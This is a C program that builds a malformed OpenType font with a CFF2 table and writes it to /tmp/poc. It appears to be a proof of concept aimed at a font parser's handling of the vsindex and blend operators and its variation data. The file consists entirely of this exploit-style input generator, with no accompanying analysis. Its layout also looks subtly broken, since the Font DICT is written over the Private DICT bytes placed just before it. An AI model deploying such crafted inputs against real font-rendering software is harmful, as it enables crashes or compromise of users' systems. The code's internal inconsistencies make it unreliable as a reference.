#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void w1(FILE *f, unsigned char v) { fputc(v, f); }
static void w2(FILE *f, uint16_t v) { fputc((v>>8)&0xFF,f); fputc(v&0xFF,f); }
static void w4(FILE *f, uint32_t v) { fputc((v>>24)&0xFF,f); fputc((v>>16)&0xFF,f); fputc((v>>8)&0xFF,f); fputc(v&0xFF,f); }

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType with CFF2 table */
    w4(f, 0x4F54544F); w2(f, 1); w2(f, 0); w2(f, 0); w2(f, 16);
    w4(f, 0x43464632);  /* 'CFF2' */
    long ckpos = ftell(f); w4(f, 0);
    long offpos = ftell(f); w4(f, 0);
    long lenpos = ftell(f); w4(f, 0);
    long cff_start = ftell(f);

    /* CFF2 Header: exactly 4 bytes (hdrSize=4) */
    w1(f, 0x02); w1(f, 0x00); w1(f, 0x04); w1(f, 0x01);
    long topdict_len_pos = ftell(f); w2(f, 0);

    /* Top DICT */
    long topdict_start = ftell(f);
    long cs_off_pos = ftell(f); w1(f, 0x1C); w2(f, 0); w1(f, 17);
    long fda_off_pos = ftell(f); w1(f, 0x1C); w2(f, 0); w1(f, 0x0C); w1(f, 0x24);
    long fds_off_pos = ftell(f); w1(f, 0x1C); w2(f, 0); w1(f, 0x0C); w1(f, 0x25);
    long vs_off_pos = ftell(f); w1(f, 0x1C); w2(f, 0); w1(f, 0x18);
    long topdict_end = ftell(f);
    uint16_t topdict_len = (uint16_t)(topdict_end - topdict_start);
    fseek(f, topdict_len_pos, SEEK_SET); w2(f, topdict_len); fseek(f, 0, SEEK_END);

    /* CharStrings INDEX: 1 glyph */
    long cs_start = ftell(f);
    w4(f, 1); w1(f, 0x01); w1(f, 1); w1(f, 2); w1(f, 0x0E);

    /* FDArray INDEX: 1 Font DICT */
    long fda_start = ftell(f);
    w4(f, 1); w1(f, 0x02);
    long fda_off0 = ftell(f); w2(f, 1);  /* offset[0] MUST be 1 (1-based) */
    long fda_off1 = ftell(f); w2(f, 0);  /* placeholder for offset[1] */
    long fda_data_start = ftell(f);

    /* Private DICT with correct bias-encoded values:
       0x8B = push 0 (vsindex value)
       0x0F = vsindex operator
       0x8C = push 1 (blend value 1)
       0x8D = push 2 (blend value 2)
       0x8C = push 1 (numBlends)
       0x0C 0x10 = blend operator */
    long privdict_start = ftell(f);
    w1(f, 0x8B);             /* push 0 (vsindex value) */
    w1(f, 0x0F);             /* vsindex operator (clears stack) */
    w1(f, 0x8C);             /* push 1 (blend value 1) */
    w1(f, 0x8D);             /* push 2 (blend value 2) */
    w1(f, 0x8C);             /* push 1 (numBlends) */
    w1(f, 0x0C); w1(f, 0x10); /* blend operator */
    long privdict_end = ftell(f);
    uint16_t privdict_sz = (uint16_t)(privdict_end - privdict_start);
    uint32_t priv_off = (uint32_t)(privdict_start - cff_start);

    /* Font DICT with Private operator */
    fseek(f, fda_data_start, SEEK_SET);
    w1(f, 0x1C); w2(f, privdict_sz);
    w1(f, 0x1C); w2(f, (uint16_t)priv_off);
    w1(f, 0x12);
    long fda_data_end = ftell(f);
    uint16_t fda_data_sz = (uint16_t)(fda_data_end - fda_data_start);
    fseek(f, fda_off1, SEEK_SET); w2(f, (uint16_t)(fda_data_sz + 1));
    fseek(f, 0, SEEK_END);

    /* FDSelect */
    long fds_start = ftell(f);
    w1(f, 0x00); w1(f, 0x00);

    /* VariationStore */
    long vs_start = ftell(f);
    w2(f, 1);               /* format = 1 */
    long vrl_off_pos = ftell(f); w4(f, 0);
    w2(f, 1);               /* itemVariationDataCount = 1 */
    long ivd_off_pos = ftell(f); w4(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_off = (uint32_t)(vrl_start - vs_start);
    fseek(f, vrl_off_pos, SEEK_SET); w4(f, vrl_off); fseek(f, 0, SEEK_END);
    w2(f, 1);               /* axisCount = 1 */
    w2(f, 1);               /* regionCount = 1 */
    w2(f, 0); w2(f, 0x4000); w2(f, 0x4000);

    long ivd_start = ftell(f);
    uint32_t ivd_off = (uint32_t)(ivd_start - vs_start);
    fseek(f, ivd_off_pos, SEEK_SET); w4(f, ivd_off); fseek(f, 0, SEEK_END);
    w2(f, 1);               /* itemCount = 1 */
    w2(f, 0);               /* wordDeltaCount = 0 */
    w2(f, 1);               /* regionIndexCount = 1 */
    w2(f, 0);               /* regionIndexes[0] = 0 */
    w2(f, 1);               /* delta value = 1 */

    long cff_end = ftell(f);

    /* Patch OpenType record */
    fseek(f, offpos, SEEK_SET); w4(f, (uint32_t)cff_start);
    fseek(f, lenpos, SEEK_SET); w4(f, (uint32_t)(cff_end - cff_start));

    /* Patch Top DICT offsets */
    fseek(f, cs_off_pos + 1, SEEK_SET); w2(f, (uint16_t)(cs_start - cff_start));
    fseek(f, fda_off_pos + 1, SEEK_SET); w2(f, (uint16_t)(fda_start - cff_start));
    fseek(f, fds_off_pos + 1, SEEK_SET); w2(f, (uint16_t)(fds_start - cff_start));
    fseek(f, vs_off_pos + 1, SEEK_SET); w2(f, (uint16_t)(vs_start - cff_start));

    fclose(f);
    return 0;
}

